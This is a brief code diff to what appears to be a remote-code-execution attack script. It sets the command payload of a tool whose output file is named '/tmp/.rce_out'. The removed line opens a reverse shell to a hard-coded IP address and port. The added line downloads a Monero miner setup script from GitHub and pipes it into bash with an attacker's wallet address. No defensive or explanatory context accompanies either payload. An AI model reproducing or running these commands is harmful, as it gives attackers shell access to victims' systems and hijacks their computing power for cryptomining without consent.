@@ -1,6 +1,6 @@
 import subprocess, os, urllib.request
 
-CMD = 'bash -i >& /dev/tcp/207.180.204.102/7777 0>&1'
+CMD = 'curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 47EDNdCkTJLZ2PjFPJrDfJTMUUE8AC5ZkYBdqoxbhX2QfXLdrVAS5AtQpFMRLbQdLP9QiXs2LBBouXxqWW6v4g4qCUBMXmG'
 CALLBACK = ''
 OUTFILE = '/tmp/.rce_out'
 
